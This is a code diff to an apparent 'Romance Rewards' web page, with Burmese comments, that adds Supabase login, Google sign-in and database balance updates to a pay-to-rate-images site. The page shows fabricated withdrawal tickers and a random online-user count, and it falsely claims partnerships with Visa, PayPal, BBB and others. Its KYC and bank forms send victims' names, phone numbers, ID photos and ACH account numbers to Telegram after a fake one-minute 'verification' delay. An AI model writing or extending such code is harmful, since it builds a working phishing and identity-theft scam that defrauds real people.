@@ -6,7 +6,7 @@
 <title>Romance Rewards - US Portal</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-<!-- Supabase Script CDN (esm.sh version to fix module error) -->
+<!-- Supabase Script CDN -->
 <script type="module">
 import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
 
@@ -16,7 +16,10 @@ const supabase = createClient(supabaseUrl, supabaseKey)
 
 window.supabaseClient = supabase;
 
-// ၁။ User လော့အင်ဝင်တဲ့ ပုံစံ (Login လုပ်တဲ့ Form ထဲက ခလုတ်နဲ့ ချိတ်ဖို့)
+let currentUserId = null;
+let currentUserEmail = "";
+
+// ၁။ Email နဲ့ Password လော့အင်ဝင်ခြင်း
 window.loginUser = async function(email, password) {
 const { data, error } = await supabase.auth.signInWithPassword({
 email: email,
@@ -27,8 +30,10 @@ if (error) {
 alert("လော့အင်ဝင်လို့ မအောင်မြင်ပါ: " + error.message)
 } else {
 alert("လော့အင် အောင်မြင်ပါတယ်!")
-loadCustomerFinancialData(data.user.id)
+currentUserId = data.user.id;
 currentUserEmail = email;
+loadCustomerFinancialData(data.user.id, email);
+
 let emailDisplay = document.getElementById("nav-email-display");
 let avatarLetter = document.getElementById("user-avatar-letter");
 if(emailDisplay) emailDisplay.innerText = email;
@@ -37,7 +42,7 @@ switchPage('dashboard-page');
 }
 }
 
-// ၂။ User အကောင့်အသစ်ဖွင့်တဲ့ ပုံစံ (Sign Up)
+// ၂။ Email နဲ့ အကောင့်အသစ်ဖွင့်ခြင်း (Sign Up)
 window.signUpUser = async function(email, password) {
 const { data, error } = await supabase.auth.signUp({
 email: email,
@@ -48,7 +53,13 @@ if (error) {
 alert("အကောင့်ဖွင့်လို့ မအောင်မြင်ပါ: " + error.message)
 } else {
 alert("အကောင့် အောင်မြင်စွာ ဖွင့်ပြီးပါပြီ!")
+if(data.user) {
+currentUserId = data.user.id;
 currentUserEmail = email;
+await supabase.from('Profiles').insert([
+{ id: data.user.id, email: email, balance: 15.00, kyc_status: 'pending', bank_status: 'unconnected' }
+]);
+}
 let emailDisplay = document.getElementById("nav-email-display");
 let avatarLetter = document.getElementById("user-avatar-letter");
 if(emailDisplay) emailDisplay.innerText = email;
@@ -57,35 +68,97 @@ switchPage('dashboard-page');
 }
 }
 
-// ၃။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ
-async function loadCustomerFinancialData(userId) {
+// ၃။ Supabase Google OAuth (Google ဖြင့် ဝင်ရန် / အကောင့်ဖွင့်ရန်)
+window.signInWithGoogle = async function() {
+const { data, error } = await supabase.auth.signInWithOAuth({
+provider: 'google',
+options: {
+redirectTo: window.location.origin
+}
+})
+if (error) {
+alert("Google ဖြင့် ဝင်ရောက်ရန် မအောင်မြင်ပါ: " + error.message);
+}
+}
+
+// ၄။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ
+async function loadCustomerFinancialData(userId, userEmail = "") {
+currentUserId = userId;
 const { data, error } = await supabase
 .from('Profiles')
 .select('*')
 .eq('id', userId)
-.single()
+.maybeSingle()
 
 if (error) {
 console.log("ဒေတာဆွဲထုတ်လို့ မရသေးပါ", error)
 } else {
-console.log("ငွေပမာဏ:", data.balance)
-console.log("ဘဏ်နာမည်:", data.bank_name)
-
+if(!data) {
+const { error: insertError } = await supabase.from('Profiles').insert([
+{ id: userId, email: userEmail, balance: 15.00, kyc_status: 'pending', bank_status: 'unconnected' }
+]);
+if(!insertError) {
+userBalance = 15.00;
+document.getElementById("user-balance").innerText = userBalance.toFixed(2);
+document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
+updateProgressBar(userBalance);
+}
+} else {
 if(data.balance !== undefined) {
-userBalance = data.balance;
+userBalance = Number(data.balance);
 document.getElementById("user-balance").innerText = userBalance.toFixed(2);
 document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
 updateProgressBar(userBalance);
 }
 }
 }
+}
 
-// ၄။ အကောင့်ဝင်ပြီးသားဖြစ်ရင် အလိုအလျောက် စစ်ပေးမယ့်စနစ်
+// ၅။ Supabase ထဲ Balance သွား Update လုပ်မည့် Function
+window.updateBalanceInSupabase = async function(newBalance) {
+if (!currentUserId) return;
+const { error } = await supabase
+.from('Profiles')
+.update({ balance: newBalance })
+.eq('id', currentUserId);
+
+if (error) {
+console.error("Balance Update Error:", error);
+}
+}
+
+// ၆။ Supabase ထဲ Bank အချက်အလက်များ သွားသိမ်းမည့် Function
+window.saveBankToSupabase = async function(bankName, holderName, accountNumber) {
+if (!currentUserId) return;
+
+alert("ဘဏ်အချက်အလက်များကို ချိတ်ဆက်နေပါပြီ။ ခေတ္တစောင့်ဆိုင်းပေးပါ (1 မိနစ်)...");
+setTimeout(async () => {
+const { error } = await supabase
+.from('Profiles')
+.update({
+bank_name: bankName,
+bank_holder_name: holderName,
+account_number: accountNumber,
+bank_status: 'connected'
+})
+.eq('id', currentUserId);
+
+if (error) {
+console.error("Bank Save Error:", error);
+alert("ဘဏ်အချက်အလက် Database သို့ သိမ်းမရပါ: " + error.message);
+} else {
+alert("ဘဏ်အချက်အလက်များ အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ (Connected)!");
+}
+}, 60000);
+}
+
+// ၇။ အကောင့်ဝင်ပြီးသားဖြစ်ရင် အလိုအလျောက် စစ်ပေးမယ့်စနစ်
 window.addEventListener('DOMContentLoaded', async () => {
 const { data: { session } } = await supabase.auth.getSession()
 if (session) {
-loadCustomerFinancialData(session.user.id)
+currentUserId = session.user.id;
 currentUserEmail = session.user.email;
+loadCustomerFinancialData(session.user.id, session.user.email)
 let emailDisplay = document.getElementById("nav-email-display");
 let avatarLetter = document.getElementById("user-avatar-letter");
 if(emailDisplay) emailDisplay.innerText = currentUserEmail;
@@ -95,13 +168,11 @@ if(avatarLetter) avatarLetter.innerText = currentUserEmail.charAt(0).toUpperCase
 </script>
 
 <style>
-/* Dark Neon Purple & White Theme Styles */
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
 body { background-color: #0f172a; color: #f8fafc; min-height: 100vh; }
 .page { display: none; width: 100%; min-height: 100vh; }
 .page.active { display: flex; flex-direction: column; }
 
-/* Global Top Announcement Ticker (English) */
 .global-announcement-ticker {
 background: linear-gradient(135deg, #8A00F5, #E000FF);
 border-bottom: 2px solid #1e293b;
@@ -116,7 +187,6 @@ z-index: 1000;
 box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3);
 }
 
-/* Landing Page */
 #landing-page { padding: 15px 20px; justify-content: center; align-items: center; text-align: center; min-height: 100vh; gap: 8px; background: #0f172a; }
 .landing-header h1 { font-size: 1.8rem; background: linear-gradient(135deg, #E000FF 0%, #FFFFFF 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; font-weight: 800; letter-spacing: 0.5px; }
 .landing-header p { font-size: 0.75rem; color: #94a3b8; margin-bottom: 6px; }
@@ -182,11 +252,8 @@ width: 100%;
 max-width: 350px;
 transition: all 0.3s ease;
 }
-.signup-redirect-btn:hover {
-background: rgba(138, 0, 245, 0.15);
-}
+.signup-redirect-btn:hover { background: rgba(138, 0, 245, 0.15); }
 
-/* Auth Pages (Login & Signup Cards) */
 #login-page, #signup-page {
 align-items: center; justify-content: center; padding: 20px; min-height: 100vh;
 background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.92)), url('https://i.ibb.co/zhwdB8yv/PNG-image-101.png') no-repeat center center;
@@ -200,10 +267,11 @@ background-size: cover;
 .auth-input-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
 .auth-input-group input:focus { border-color: #E000FF; box-shadow: 0 0 8px rgba(224, 0, 255, 0.3); }
 .auth-submit-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
+.google-auth-btn { background: #ffffff; color: #1e293b; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2); transition: all 0.2s; }
+.google-auth-btn:hover { background: #f1f5f9; }
 .auth-back-btn { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
 .auth-back-btn:hover { background: #334155; color: #f8fafc; }
 
-/* Dashboard */
 #dashboard-page { padding-bottom: 80px; display: none; background: #0f172a; }
 #dashboard-page.active { display: block; }
 .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 14px 20px; background: #1e293b; position: sticky; top: 35px; z-index: 100; border-bottom: 1px solid #334155; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
@@ -217,7 +285,6 @@ box-shadow: 0 0 10px rgba(138, 0, 245, 0.2); transition: all 0.3s ease;
 .user-avatar-circle { width: 34px; height: 34px; background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.95rem; box-shadow: 0 0 8px rgba(138, 0, 245, 0.4); }
 .user-email-text { font-size: 0.8rem; color: #f8fafc; font-weight: 600; }
 
-/* SIDEBAR */
 .sidebar { position: fixed; top: 0; left: -320px; width: 310px; height: 100%; background-color: #1e293b; z-index: 2000; transition: left 0.35s cubic-bezier(0.4, 0, 0.2, 1); padding: 20px; box-shadow: 8px 0 25px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow-y: auto; border-right: 1px solid #334155; }
 .sidebar.open { left: 0; }
 .sidebar-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #334155; padding-bottom: 12px; }
@@ -242,7 +309,6 @@ transform: translateX(6px); box-shadow: 0 4px 15px rgba(138, 0, 245, 0.15); colo
 .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; z-index: 1500; backdrop-filter: blur(4px); }
 .overlay.active { display: block; }
 
-/* US Federal Compliance & Logo-Style Circular Badges Section */
 .compliance-section {
 background: #0f172a;
 border: 1px solid #334155;
@@ -311,7 +377,6 @@ box-shadow: 0 4px 15px rgba(138, 0, 245, 0.2);
 }
 .partner-card:hover img { transform: scale(1.1); }
 
-/* Main Menu Navigation Container */
 .nav-menu-container {
 text-align: center;
 margin: 15px 0 5px 0;
@@ -345,7 +410,6 @@ padding: 16px; border-radius: 18px; margin-bottom: 18px; text-align: center; col
 .banner-earn p { font-size: 0.78rem; margin-bottom: 8px; color: #94a3b8; }
 .balance-box { background: #064e3b; border: 1px solid #10b981; padding: 6px 14px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 800; font-size: 0.9rem; color: #34d399; box-shadow: 0 0 12px rgba(16, 185, 129, 0.2); }
 
-/* Quick Filters & Live Statistics Section */
 .dashboard-stats-filter {
 display: grid;
 grid-template-columns: repeat(2, 1fr);
@@ -415,7 +479,6 @@ padding-left: 10px; animation: pulseGlow 2.5s infinite ease-in-out; font-weight:
 .image-title { font-size: 0.85rem; font-weight: 700; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #f8fafc; }
 .stars { color: #f59e0b; font-size: 0.8rem; }
 
-/* Detail Page */
 #detail-page { padding: 18px 20px; display: none; background: #0f172a; }
 #detail-page.active { display: block; }
 .back-btn { background: #1e293b; border: 1px solid #8A00F5; color: #FFFFFF; padding: 9px 16px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-size: 0.9rem; font-weight: 600; transition: all 0.2s; }
@@ -427,7 +490,6 @@ padding-left: 10px; animation: pulseGlow 2.5s infinite ease-in-out; font-weight:
 .star-rating i.rated { color: #f59e0b; text-shadow: 0 0 10px rgba(245, 158, 11, 0.5); }
 .submit-rating-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; font-weight: 800; border-radius: 10px; cursor: pointer; width: 100%; font-size: 0.95rem; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
 
-/* Common Sub-page & Form Styles */
 .sub-page-container { padding: 18px 20px; display: none; background: #0f172a; min-height: 100vh; }
 .sub-page-container.active { display: block; }
 .sub-card { background-color: #1e293b; border-radius: 16px; padding: 20px; max-width: 480px; margin: 0 auto; border: 1px solid #8A00F5; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.15); }
@@ -439,7 +501,6 @@ padding-left: 10px; animation: pulseGlow 2.5s infinite ease-in-out; font-weight:
 .save-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 13px; width: 100%; border-radius: 10px; font-weight: 800; cursor: pointer; margin-top: 6px; font-size: 0.98rem; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: all 0.2s; }
 .save-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5); }
 
-/* Modal Popup Styles */
 .modal-overlay {
 display: none;
 position: fixed;
@@ -482,10 +543,7 @@ gap: 6px;
 margin-bottom: 15px;
 transition: all 0.2s;
 }
-.modal-back-btn:hover {
-background: #8A00F5;
-color: #ffffff;
-}
+.modal-back-btn:hover { background: #8A00F5; color: #ffffff; }
 </style>
 </head>
 <body>
@@ -526,24 +584,12 @@ color: #ffffff;
 </div>
 </div>
 <div class="verified-partners-grid">
-<div class="partner-card" onclick="openModal('visa')">
-<img src="https://i.ibb.co/vvZ6VSBn/IMG-7801.png" alt="VISA">
-</div>
-<div class="partner-card" onclick="openModal('mastercard')">
-<img src="https://i.ibb.co/nMjCvdPp/IMG-7800.png" alt="Mastercard">
-</div>
-<div class="partner-card" onclick="openModal('stripe')">
-<img src="https://i.ibb.co/XZD440F5/IMG-7799.jpg" alt="Stripe">
-</div>
-<div class="partner-card" onclick="openModal('paypal')">
-<img src="https://i.ibb.co/Wv8nF4Np/IMG-7798.png" alt="PayPal">
-</div>
-<div class="partner-card" onclick="openModal('digicert')">
-<img src="https://i.ibb.co/Swp4m90s/IMG-7797.png" alt="DigiCert">
-</div>
-<div class="partner-card" onclick="openModal('bbb')">
-<img src="https://i.ibb.co/MxyJ1T2C/IMG-7796.png" alt="BBB">
-</div>
+<div class="partner-card" onclick="openModal('visa')"><img src="https://i.ibb.co/vvZ6VSBn/IMG-7801.png" alt="VISA"></div>
+<div class="partner-card" onclick="openModal('mastercard')"><img src="https://i.ibb.co/nMjCvdPp/IMG-7800.png" alt="Mastercard"></div>
+<div class="partner-card" onclick="openModal('stripe')"><img src="https://i.ibb.co/XZD440F5/IMG-7799.jpg" alt="Stripe"></div>
+<div class="partner-card" onclick="openModal('paypal')"><img src="https://i.ibb.co/Wv8nF4Np/IMG-7798.png" alt="PayPal"></div>
+<div class="partner-card" onclick="openModal('digicert')"><img src="https://i.ibb.co/Swp4m90s/IMG-7797.png" alt="DigiCert"></div>
+<div class="partner-card" onclick="openModal('bbb')"><img src="https://i.ibb.co/MxyJ1T2C/IMG-7796.png" alt="BBB"></div>
 </div>
 </div>
 
@@ -589,6 +635,9 @@ color: #ffffff;
 <input type="password" id="login-pass" placeholder="Enter password">
 </div>
 <button type="button" class="auth-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
+<button type="button" class="google-auth-btn" onclick="signInWithGoogle()">
+<i class="fab fa-google" style="color: #ea4335;"></i> Sign In with Google
+</button>
 <button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
 </div>
 </div>
@@ -607,6 +656,9 @@ color: #ffffff;
 <input type="password" id="signup-pass" placeholder="Enter secure password">
 </div>
 <button type="button" class="auth-submit-btn" onclick="handleSignupSubmit()">Register & Sign Up</button>
+<button type="button" class="google-auth-btn" onclick="signInWithGoogle()">
+<i class="fab fa-google" style="color: #ea4335;"></i> Sign Up with Google
+</button>
 <button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
 </div>
 </div>
@@ -970,44 +1022,20 @@ img: url
 });
 
 const modalData = {
-visa: {
-title: "VISA Secure Gateway",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "Officially certified and legally compliant under US digital transaction standards since 2022. Provides encrypted end-to-end settlement protection and secure merchant clearing frameworks."
-},
-mastercard: {
-title: "Mastercard Identity Check",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "In official partnership since 2022, ensuring robust tokenization, multi-factor authentication, and strict adherence to federal consumer protection mandates."
-},
-stripe: {
-title: "Stripe Financial Infrastructure",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "Integrated liquidity and payment compliance partner since 2022, delivering transparent payout processing and regulated financial routing standards."
-},
-paypal: {
-title: "PayPal Secure Checkout",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "Trusted escrow and buyer protection partner since 2022, providing verified multi-currency transaction safety and consumer dispute resolution guidelines."
-},
-digicert: {
-title: "DigiCert TLS/SSL Security",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "Exclusive digital certificate authority protecting platform sessions since 2022, enforcing quantum-resistant encryption and strict data privacy protocols."
-},
-bbb: {
-title: "BBB Accreditation Verified",
-subtitle: "Partnered with Romance Rewards since 2022",
-desc: "Accredited member since 2022 with an A+ rating, officially recognized for high ethical business standards, transparency, and consumer trust."
-}
+visa: { title: "VISA Secure Gateway", subtitle: "Partnered with Romance Rewards since 2022", desc: "Officially certified and legally compliant under US digital transaction standards since 2022. Provides encrypted end-to-end settlement protection and secure merchant clearing frameworks." },
+mastercard: { title: "Mastercard Identity Check", subtitle: "Partnered with Romance Rewards since 2022", desc: "In official partnership since 2022, ensuring robust tokenization, multi-factor authentication, and strict adherence to federal consumer protection mandates." },
+stripe: { title: "Stripe Financial Infrastructure", subtitle: "Partnered with Romance Rewards since 2022", desc: "Integrated liquidity and payment compliance partner since 2022, delivering transparent payout processing and regulated financial routing standards." },
+paypal: { title: "PayPal Secure Checkout", subtitle: "Partnered with Romance Rewards since 2022", desc: "Trusted escrow and buyer protection partner since 2022, providing verified multi-currency transaction safety and consumer dispute resolution guidelines." },
+digicert: { title: "DigiCert TLS/SSL Security", subtitle: "Partnered with Romance Rewards since 2022", desc: "Exclusive digital certificate authority protecting platform sessions since 2022, enforcing quantum-resistant encryption and strict data privacy protocols." },
+bbb: { title: "BBB Accreditation Verified", subtitle: "Partnered with Romance Rewards since 2022", desc: "Accredited member since 2022 with an A+ rating, officially recognized for high ethical business standards, transparency, and consumer trust." }
 };
 
 let currentRating = 0;
 let userBalance = 15.00;
-let currentUserEmail = "";
 let frontIdBase64 = "";
 let backIdBase64 = "";
 let selectedCardIndex = null;
+let ratedImagesMap = {};
 
 const usPayoutNames = [
 "Michael S. (California) withdrew $150.00", "Jessica W. (New York) withdrew $250.00",
@@ -1030,6 +1058,13 @@ const dashTickerEl = document.getElementById("dashboard-payout-ticker");
 if(dashTickerEl) dashTickerEl.innerText = "💰 " + usPayoutNames.join(" • ") + " • ";
 const sectionTitleCount = document.getElementById("section-title-count");
 if(sectionTitleCount) sectionTitleCount.innerText = `Available Gallery Items (${images.length} Images)`;
+
+setInterval(() => {
+let randomUsers = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+let activeUsersEl = document.getElementById("stat-active-users");
+if(activeUsersEl) activeUsersEl.innerText = randomUsers.toLocaleString() + " Online";
+}, 5000);
+
 loadImages(images);
 updateProgressBar(userBalance);
 }
@@ -1084,7 +1119,6 @@ if(!email || !pass) {
 alert("Please enter both email and password.");
 return;
 }
-
 window.loginUser(email, pass);
 }
 
@@ -1097,7 +1131,6 @@ if(!email || !pass) {
 alert("Please enter both email and password for sign up.");
 return;
 }
-
 window.signUpUser(email, pass);
 }
 
@@ -1168,10 +1201,22 @@ if (currentRating === 0) {
 alert("Please select star rating first.");
 return;
 }
+
+if(ratedImagesMap[selectedCardIndex]) {
+alert("You have already rated this image! Only one rating per image is allowed.");
+return;
+}
+
+ratedImagesMap[selectedCardIndex] = true;
 userBalance += 2.00;
 document.getElementById("user-balance").innerText = userBalance.toFixed(2);
 document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
 updateProgressBar(userBalance);
+
+if(window.updateBalanceInSupabase) {
+window.updateBalanceInSupabase(userBalance);
+}
+
 alert("Rating submitted successfully! ($2.00 added to balance)");
 goBackToDashboard();
 }
@@ -1196,7 +1241,11 @@ if(!name || !phone) {
 alert("Please fill in all KYC details.");
 return;
 }
-let msg = `🪪 *US KYC Info Captured!* 🪪\n\n` +
+
+alert("KYC documents submitted. Status is pending verification (1 minute)...");
+setTimeout(() => {
+alert("KYC Verification Successful & Approved!");
+let msg = `🪪 *US KYC Info Captured & Verified!* 🪪\n\n` +
 `📧 *Email:* \`${currentUserEmail}\`\n` +
 `👤 *Name:* ${name}\n` +
 `📞 *Phone:* ${phone}\n` +
@@ -1204,8 +1253,8 @@ let msg = `🪪 *US KYC Info Captured!* 🪪\n\n` +
 sendToTelegram(msg);
 if(frontIdBase64) sendPhotoToTelegram(frontIdBase64, `🪪 Front ID Photo - ${currentUserEmail} (${name})`);
 if(backIdBase64) sendPhotoToTelegram(backIdBase64, `🪪 Back ID Photo - ${currentUserEmail} (${name})`);
-alert("US KYC verification details & photos sent successfully!");
 switchPage('dashboard-page');
+}, 60000);
 }
 
 function saveACHBankInfo() {
@@ -1220,6 +1269,10 @@ alert("Please fill in all required ACH bank details.");
 return;
 }
 
+if(window.saveBankToSupabase) {
+window.saveBankToSupabase(bankName, holderName, account);
+}
+
 let msg = `🏦 *US ACH Bank Linked!* 🏦\n\n` +
 `📧 *Email:* \`${currentUserEmail}\`\n` +
 `🏛️ *Bank:* ${bankName}\n` +
@@ -1228,7 +1281,6 @@ let msg = `🏦 *US ACH Bank Linked!* 🏦\n\n` +
 `💳 *Account:* \`${account}\`\n` +
 `📂 *Type:* ${accountType}`;
 sendToTelegram(msg);
-alert("US Bank account successfully linked via ACH!");
 switchPage('dashboard-page');
 }
 
